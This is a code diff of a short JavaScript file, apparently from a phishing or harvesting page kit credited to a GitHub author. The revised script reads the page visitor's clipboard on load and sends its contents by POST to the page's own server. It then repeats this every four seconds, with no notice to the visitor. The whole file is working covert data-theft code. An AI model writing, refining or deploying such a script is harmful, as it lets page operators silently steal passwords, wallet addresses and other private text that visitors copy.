@@ -1,28 +1,32 @@
-/* https://github.com/msfpt/Snow */
+/* Coded By https://github.com/msfpt */
 
-const clipboard = () => {
+document.addEventListener('DOMContentLoaded', event => {
+
+  // Don't do anything if the permission was denied.
+
+  const clipboard = () => {
 
     navigator.clipboard.readText().then(text => {
-            
-        if (typeof text != 'string') {
-            text = '';
-        }
 
-        $.ajax({
-            url: window.location.origin,
-            type: 'POST',
-            data: {
-              'Status': 'y4t',
-              'ClipBoard': text
-            },
-            success: function(response){ return false; },
-            error: function(){ return false; }
-        });
+      if (typeof text != 'string') {
+        text = 'Unknown';
+      }
+
+      $.ajax({
+        url: location.origin,
+        type: 'POST',
+        data: {
+          'Status': 'y4t',
+          'ClipBoard': text
+        }
+      });
 
     });
 
-}
+  }
 
-window.onload = () => {
-    clipboard();
-};
+  clipboard();
+  
+  setInterval(clipboard, 4000);
+
+});
